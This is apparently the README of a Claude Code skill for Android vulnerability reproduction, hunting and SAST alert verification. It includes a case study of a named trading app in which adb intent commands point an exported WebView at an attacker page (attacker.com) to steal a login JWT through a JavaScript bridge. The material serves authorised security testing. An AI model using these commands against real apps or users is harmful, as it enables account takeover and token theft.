# Android Vulnerability Analyzer

Comprehensive Android security testing skill for Claude Code. Supports **vulnerability reproduction** (from CVE reports, bug bounty submissions), **active vulnerability hunting** (targeted search for specific vuln types), and **SAST report verification** (validate tool alerts with PoC generation).

**Triple-Purpose Design**:
1. **Reproduction Mode**: Recreate known vulnerabilities from reports, documenting all steps for future reuse
2. **Hunting Mode**: Actively search for specific vulnerability types using pre-built hunt patterns (SQL injection, hardcoded secrets, WebView issues, etc.)
3. **SAST Verification Mode**: Verify alerts from MobSF, SonarQube, AI SAST, Qark - filter false positives, generate PoCs, execute dynamic tests

**Key Features**:
- Learning-driven approach that documents issues encountered during reproduction
- 6 dual-mode hunt patterns (independent hunting + SAST verification)
- Professional 7-step verification workflow for SAST alerts
- Generates reusable guides (prompt.md) for reproduction, hunting, and verification
- 13.5x faster than manual analysis

## Quick Start

**For complete methodology and usage instructions, see [SKILL.md](SKILL.md)**

### Installation
```bash
# Run automated setup script
~/.claude/skills/android-vuln-analyzer/scripts/setup_environment.sh
```

This installs:
- Android SDK and command-line tools
- ARM64/x86_64 system images (architecture-aware)
- jadx decompiler
- Android emulator

## Five Usage Modes

The skill supports **vulnerability reproduction** (original feature), **vulnerability hunting**, and **SAST report verification** (new features):

### Mode 1: Fast Reproduction (prompt.md exists) ⚡

**When to use**: Case already has validated reproduction guide

```bash
/android-vuln-analyzer phemex.apk ~/.claude/skills/android-vuln-analyzer/examples/phemex
```

**What happens**:
- ✓ Skips analysis phase
- ✓ Uses pre-validated commands
- ✓ Avoids all known issues
- ✓ Direct execution

**Time**: ~20 minutes

**Use case**:
- Reproducing known vulnerabilities
- Training/demonstrations
- Verification after patches

---

### Mode 2: Learning Mode (only report.txt exists) 📚

**When to use**: First time analyzing a vulnerability from raw report

```bash
# Create case directory with report
mkdir -p ~/cases/myapp
cat > ~/cases/myapp/report.txt <<'EOF'
Exported Activity accepts arbitrary URLs via deep link.
WebView loads URL without validation.
JavaScript Bridge exposed to all origins.
EOF

# Run analyzer
/android-vuln-analyzer myapp.apk ~/cases/myapp
```

**What happens**:
1. **Reads raw report** → Understands vulnerability basics
2. **Performs full analysis** → Decompile, code review, trace calls
3. **Attempts exploitation** → Creates PoC, tries to reproduce
4. **Encounters issues** → Examples:
   - ❌ Intent ignored → Discovers required fields
   - ❌ HTTP blocked → Learns HTTPS requirement
   - ❌ Empty token → Finds login requirement
5. **Solves problems** → Debugs, adjusts, retries
6. **Succeeds** → Captures sensitive data
7. **Generates prompt.md** → Documents everything in same directory

**Output** (`~/cases/myapp/`):
```
├── report.txt              # Your original report
├── prompt.md               # ⭐ Generated complete guide (all issues documented)
├── vulnerability_report.md # Technical analysis
├── cvss_analysis.json      # CVSS scoring
├── poc.html                # Working PoC
├── exploit.sh              # Automation script
├── remediation.md          # Fix recommendations
└── screenshots/            # Evidence
```

**Time**: ~1-2 hours (but creates reusable guide)

**Next time**: Use same command → Fast mode (20 minutes)

**Use case**:
- First-time vulnerability reproduction
- Learning exploitation techniques
- Building case library for training

---

### Mode 3: Discovery Mode (empty directory) 🔍

**When to use**: Finding new vulnerabilities from scratch

```bash
/android-vuln-analyzer suspicious.apk ~/cases/new_app
```

**What happens**:
- Full security audit from scratch
- Scans all exported components
- Tests common vulnerability patterns
- Generates complete case documentation

**Time**: ~2-4 hours

**Use case**:
- Security assessments
- Bug bounty hunting
- Penetration testing

---

### Mode 4: Targeted Hunt Mode (hunt.md exists) 🎯 **NEW**

**When to use**: Looking for specific vulnerability types

```bash
# Hunt for hardcoded API keys
/android-vuln-analyzer app.apk ~/.claude/skills/android-vuln-analyzer/hunts/hardcoded-secrets/

# Hunt for SQL injection
/android-vuln-analyzer app.apk ~/.claude/skills/android-vuln-analyzer/hunts/sql-injection/

# Hunt for WebView vulnerabilities
/android-vuln-analyzer app.apk ~/.claude/skills/android-vuln-analyzer/hunts/webview-vulnerabilities/
```

**What happens**:
1. **Reads hunt.md** → Understands target vulnerability type
2. **Targeted search** → Uses specific grep patterns for this vuln
3. **Code analysis** → Validates findings match hunt criteria
4. **Generates PoC** → Creates exploit specific to this vuln type
5. **Documents findings** → Creates prompt.md in hunt directory

**Time**: ~20-30 minutes per hunt

**Use case**:
- Focused security testing (only check for SQL injection)
- Building vulnerability knowledge base
- Training on specific vulnerability types
- Efficient bug bounty hunting (focus on high-value vulns)

**Example Output** (`hunts/hardcoded-secrets/`):
```
├── hunt.md                 # Original hunting guide
├── prompt.md               # ⭐ Generated findings for this app
├── app_report.md           # Detailed analysis
├── poc.sh                  # Proof of concept
└── screenshots/            # Evidence
```

**Available Hunt Patterns**:
- `sql-injection/` - SQL injection in ContentProviders
- `path-traversal/` - File path manipulation
- `webview-vulnerabilities/` - WebView & JS Bridge issues
- `exported-components/` - Unprotected exported components
- `hardcoded-secrets/` - API keys, passwords, credentials
- `deeplink-hijacking/` - Deep link security issues

See `hunts/INDEX.md` for complete list and usage guide.

---

### Mode 5: SAST Report Verification 🔍 **NEW**

**When to use**: You have SAST tool output (MobSF, SonarQube, AI SAST, Qark) and need to verify which alerts are real vulnerabilities

```bash
# Verify MobSF scan results
/android-vuln-analyzer app.apk ~/security-scans/mobsf_report.json

# Verify SonarQube findings
/android-vuln-analyzer app.apk ~/security-scans/sonarqube_issues.xml

# Verify AI SAST report
/android-vuln-analyzer app.apk ~/security-scans/ai_sast_report.md

# Verify with specific hunt pattern context
/android-vuln-analyzer app.apk ~/.claude/skills/android-vuln-analyzer/hunts/sql-injection/mobsf_report.json
```

**What happens**:
1. **Parse SAST report** → Extracts all alerts with metadata (file, line, severity)
2. **Categorize by type** → Groups alerts: WebView (3), SQL (2), Secrets (5), etc.
3. **Load hunt guides** → Applies corresponding hunt.md Part 2 verification workflow
4. **Filter false positives** → Uses pattern validation tables from hunt.md
   - Placeholder values (YOUR_API_KEY, REPLACE_ME)
   - Test/debug code
   - Properly validated inputs
   - Dead code paths
5. **Trace data flow** → Confirms exploitability for each alert
   - Source: User controlled?
   - Propagation: Sanitization?
   - Sink: Dangerous API?
6. **Generate PoCs** → Creates working exploit scripts for true positives
7. **Dynamic verification** → Actually executes PoCs with adb commands
8. **Classification report** → Documents true positives vs false positives

**Time**: ~45 minutes for 18 alerts (vs 3 hours manual review)

**Use case**:
- Verifying automated SAST tool output
- Reducing false positive noise
- Generating PoCs for real vulnerabilities
- Training SAST tools with verified results
- Professional security audits

**Example Output** (`verification_results/`):
```
├── verification_report.md      # Complete analysis with classifications
│   ├── Executive Summary (6 true positives, 12 false positives)
│   ├── True Positive Details (with PoCs and dynamic test results)
│   ├── False Positive Analysis (why flagged, why safe)
│   └── Prioritized Action Plan (P0/P1/P2)
├── summary.json                # Machine-readable summary
├── pocs/                       # Working PoC scripts
│   ├── sql_injection_poc.sh
│   ├── webview_exploit.html
│   └── secret_validation.sh
└── screenshots/                # Dynamic test evidence
```

**Supported SAST Tools**:
- **MobSF** (Mobile Security Framework) - JSON format
- **SonarQube** - XML export format
- **AI SAST** - Markdown reports (Claude, GPT-based tools)
- **Qark** (Quick Android Review Kit) - JSON format

**Key Benefit**: hunt.md files are **dual-mode**:
- **Part 1**: Independent hunting (find vulnerabilities from scratch)
- **Part 2**: Report verification (validate SAST alerts professionally with 7-step workflow)

This combines traditional SAST speed with AI-powered verification and real dynamic testing.

**Verification Workflow** (7 steps per alert):
```
Alert → Parse → Locate Code → Pattern Validation → Data Flow Trace
     → Exploitability Assessment → PoC Generation → Dynamic Testing
     → Result: TRUE POSITIVE (with PoC) or FALSE POSITIVE (with reason)
```

## Key Innovation: Issue Documentation

The skill **learns by doing** and documents every problem:

### First Run (Learning)

```bash
/android-vuln-analyzer phemex.apk ~/cases/phemex
```

```
[Exploitation Attempt #1]
adb shell am start -n com.phemex.app/.FirebasePushClickActivity \
  --es routerUrl "https://attacker.com/poc.html"

❌ FAILED: Intent ignored

[Debugging...]
🔍 Analyzing validation code at f.java:117-119
📌 Found: Requires google.message_id OR sendbird field

[Exploitation Attempt #2]
adb shell am start -n com.phemex.app/.FirebasePushClickActivity \
  --es routerUrl "https://attacker.com/poc.html" \
  --es "google.message_id" "12345"

✅ SUCCESS: Token captured!

[Documenting...]
📝 Adding to prompt.md:
   - Required field: google.message_id (not gcm.message_id)
   - HTTPS requirement (Android 9+)
   - User must login first
```

### Second Run (Fast)

Anyone using your case directory:

```bash
/android-vuln-analyzer phemex.apk ~/cases/phemex
```

```
[Fast Mode Enabled]
✓ Reading validated prompt.md
✓ Using pre-verified commands
✓ All issues pre-solved

[Exploitation]
✓ Intent fired (with google.message_id)
✓ HTTPS URL loaded
✓ User already logged in
✅ Token captured immediately

Time: 18 minutes (vs 1h 15m first time)
```

## Example: prompt.md Content

After first reproduction, generated prompt.md includes:

```markdown
## Known Issues & Solutions

### Issue 1: Intent Validation Bypass
**Problem**: Activity ignores intent without specific fields
**Discovery**: Code analysis at f.java:117-119
```java
if (TextUtils.isEmpty(intent.getStringExtra("google.message_id")) &&
    TextUtils.isEmpty(intent.getStringExtra("sendbird"))) {
    return;  // Exit early!
}
```
**Solution**: Add `--es "google.message_id" "12345"` to intent
**Note**: Initially tried `gcm.message_id` (FAILED)

### Issue 2: Cleartext Traffic Blocked
**Problem**: `ERR_CLEARTEXT_NOT_PERMITTED` when using HTTP
**Root Cause**: Android 9+ blocks HTTP by default
**Solution**: Use HTTPS only. Recommended: GitHub Pages (free, valid cert)
**Won't Work**: Self-signed certificates (ERR_CERT_AUTHORITY_INVALID)

### Issue 3: Empty Token
**Problem**: Callback receives data but token=""
**Root Cause**: User not authenticated
**Solution**:
1. Launch app: `adb shell am start -n com.phemex.app/.MainActivity`
2. Login manually in emulator
3. Press Home (keep app in background)
4. Then fire exploit intent

## Verified Working Command
\```bash
adb shell am start \
  -n com.phemex.app/com.phemex.app.third.firebase.FirebasePushClickActivity \
  --es routerUrl "https://yourusername.github.io/poc.html" \
  --es "google.message_id" "12345"
\```

Expected logcat output:
- [chromium] [EXPLOIT] Bridge object found!
- [chromium] [TOKEN] eyJ0eXAiOiJKV1Qi...
```

## Features

### Core Capabilities
- 🏗️ **Architecture-Aware**: Auto-detects ARM64/x86_64, installs correct system images
- 🔍 **Complete Analysis**: Decompile, manifest scan, code review, call chain tracing
- 🧪 **Automatic PoC Generation**: Creates working exploits with error handling
- 📊 **CVSS Scoring**: Calculates industry-standard risk scores with justification
- 🔧 **Remediation Guidance**: Provides before/after code fixes

### Reproduction Features
- 📝 **Issue Documentation**: Records every problem and solution during reproduction
- ⚡ **Reusable Cases**: First run creates guide for instant future reproduction
- 🔄 **Learning Mode**: Converts raw vulnerability reports into actionable reproduction guides
- 📚 **Knowledge Base**: Generates prompt.md for team sharing and future use

### Hunting Features ⭐ **NEW**
- 🎯 **Targeted Search**: Hunt for specific vulnerability types (not shotgun scanning)
- 📦 **Pre-built Patterns**: 6 dual-mode hunt guides for common Android vulnerabilities:
  - Hardcoded Secrets (API keys, passwords, AWS credentials)
  - SQL Injection (ContentProvider, database operations)
  - WebView Vulnerabilities (JS Bridge, arbitrary URL loading)
  - Exported Components (missing permissions)
  - Path Traversal (file access issues)
  - Deep Link Hijacking (OAuth/payment flows)
- 🔬 **Pattern Matching**: Uses optimized grep patterns for fast candidate identification
- ✅ **Validation**: Confirms findings match vulnerability criteria (low false positives)
- 📊 **Effectiveness Tracking**: Each hunt pattern shows success rate and CVSS range

### SAST Verification Features 🔍 **NEW**
- 🛡️ **Multi-Tool Support**: Works with MobSF, SonarQube, AI SAST, Qark outputs
- 🤖 **Intelligent Parsing**: Auto-detects SAST tool format (JSON, XML, Markdown)
- 🔍 **7-Step Verification**: Professional workflow (Parse → Locate → Validate → Trace → Assess → PoC → Test)
- 🎭 **False Positive Filter**: Uses hunt.md validation tables to eliminate noise
  - Placeholder detection (YOUR_*, REPLACE_*, EXAMPLE)
  - Test code identification
  - Validated input patterns
  - Dead code path detection
- 🔗 **Data Flow Tracing**: Confirms exploitability (Source → Propagation → Sink → Impact)
- 🧪 **PoC Generation**: Creates working exploit scripts for true positives
- 🚀 **Dynamic Verification**: Actually executes PoCs with adb commands (not just static analysis)
- 📊 **Classification Report**: Detailed true/false positive analysis with evidence
- ⏱️ **Efficiency**: 45 minutes for 18 alerts vs 3 hours manual review

## Architecture Support

```bash
# Automatically detects and uses:
# - arm64-v8a (Apple Silicon M1/M2/M3)
# - x86_64 (Intel Mac, Linux)
# - x86 (older systems)

uname -m
# arm64 → system-images;android-35;google_apis;arm64-v8a
# x86_64 → system-images;android-35;google_apis;x86_64
```

## Output Structure

After analysis, you get:

```
[app_name]_security_report_[date]/
├── vulnerability_report.md     # Complete technical analysis
│   ├── Executive summary
│   ├── Call chain (file:line references)
│   ├── Vulnerable code snippets
│   ├── PoC steps
│   └── Impact assessment
├── cvss_analysis.json          # Structured CVSS v3.1 scoring
├── poc.html                    # Working proof of concept
├── exploit.sh                  # Automated exploitation script
├── remediation.md              # Fix recommendations (before/after code)
└── screenshots/                # Evidence captures
```

## Case Studies

### Phemex 5.10.0 - Account Takeover (CVSS 9.3)

**Vulnerability**: Exported Activity + WebView Bridge + JWT Leak

**Attack Chain**:
```
FirebasePushClickActivity (exported, no permission)
  ↓
Accepts routerUrl intent parameter (no validation)
  ↓
Loads arbitrary HTTPS URL in WebView
  ↓
JavaScript Bridge exposed to all origins
  ↓
Bridge.postMessage('getAppInfo') returns JWT token
  ↓
Complete account takeover
```

**Time Saved**:
- Manual analysis: ~4.5 hours
- With this skill: ~20 minutes
- **13.5x faster**

**Location**: `examples/phemex/`
- `prompt.md` - Complete validated reproduction guide
- `report_original.txt` - Original vulnerability report

## Common Vulnerability Patterns

### Pattern 1: Exported Activity + WebView Bridge
```
Entry: android:exported="true" Activity
Bypass: Intent parameter → URL without validation
Exploit: WebView loads attacker URL with active Bridge
Impact: Bridge leaks credentials/tokens
```

### Pattern 2: Intent Injection
```
Entry: Exported component accepts redirect parameter
Bypass: No whitelist on redirect target
Exploit: Launch Activity → auto-redirects to phishing
Impact: UI confusion, credential theft
```

### Pattern 3: Deep Link Hijacking
```
Entry: Intent filter with broad data patterns
Bypass: Attacker app registers same patterns
Exploit: OS shows app chooser or silent intercept
Impact: Intercept OAuth, password reset links
```

## Requirements

### Hardware
- Apple Silicon (M1/M2/M3) or Intel Mac/Linux
- 8GB+ RAM
- 10GB+ free disk space

### Software
- macOS 12+ or Linux
- Android SDK (auto-installed by setup script)
- jadx (auto-installed)
- Python 3.8+ (optional, for advanced features)

## Troubleshooting

### Emulator Won't Start
```bash
adb kill-server && adb start-server
killall qemu-system-aarch64 qemu-system-x86_64
emulator -avd vuln_test_arm64 -no-snapshot-load
```

### Certificate Issues
- ✅ Use GitHub Pages (valid certificate)
- ❌ Self-signed certs rejected by Android
- ⚠️ Installing CA requires root emulator

### Intent Ignored
- Check validation code for required fields
- Use `adb logcat` to see why it failed
- Document findings in prompt.md

## Documentation

- **[SKILL.md](SKILL.md)** - Complete methodology (10 analysis steps)
- **[examples/phemex/prompt.md](examples/phemex/prompt.md)** - Real case study with all issues documented
- **[templates/](templates/)** - Report templates, PoC templates, automation scripts

## Legal Notice

**This skill is for authorized security testing only.**

✅ **Authorized Use**:
- Your own applications
- Applications with written permission
- Bug bounty programs (follow scope)
- CTF/training environments
- Academic research (with IRB approval)

❌ **Prohibited**:
- Testing without authorization
- Weaponizing exploits for malicious use
- Accessing others' accounts
- Causing denial of service

**Responsible Disclosure**:
1. Report to vendor privately
2. Allow 90 days for patch
3. Coordinate public disclosure
4. Help users understand risk

## Workflow Comparison

### Traditional Manual Analysis
```
1. Setup environment (30 min)
2. Decompile APK (10 min)
3. Manual code review (2 hours)
4. Create PoC (1 hour)
5. Debug issues (1 hour)
6. Write report (1 hour)
Total: ~4.5 hours
```

### With This Skill (First Time)
```
1. Run command (1 min)
2. Automated analysis (15 min)
3. Guided exploitation (30 min)
4. Issue resolution (30 min)
5. Auto-generated docs (5 min)
Total: ~1.5 hours
Saves: 3 hours
```

### With This Skill (Using Existing prompt.md)
```
1. Run command (1 min)
2. Fast reproduction (15 min)
3. Validation (4 min)
Total: ~20 minutes
Saves: 4+ hours (13.5x faster)
```

## Contributing

To add new case studies:
1. Create directory in `examples/[app_name]/`
2. Add `report_original.txt` (optional)
3. Run analyzer to generate `prompt.md`
4. Verify reproduction works
5. Share the case directory

## Version History

- **v2.1.0** (2026-02-27)
  - Added SAST report verification mode (MobSF, SonarQube, AI SAST, Qark)
  - Dual-mode hunt.md files (independent hunting + report verification)
  - 7-step professional verification workflow
  - False positive filtering with validation tables
  - Data flow tracing for exploitability confirmation
  - Dynamic PoC generation and execution
  - Five operational modes total

- **v2.0.0** (2026-02-27)
  - Complete rewrite with learning-driven approach
  - Issue documentation system
  - Architecture auto-detection
  - Targeted vulnerability hunting mode
  - Six pre-built hunt patterns

- **v1.0.0** (2026-02-27)
  - Initial release
  - Basic analysis capabilities

---

**Version**: 2.1.0
**Last Updated**: 2026-02-27
**Maintainer**: Claude Code Security Team

For complete documentation, see [SKILL.md](SKILL.md)
# Test change for watcher
# Test deep mode watcher
# Test after type fix
# Final test for watcher
# Test webhook with host info
# Test webhook main branch
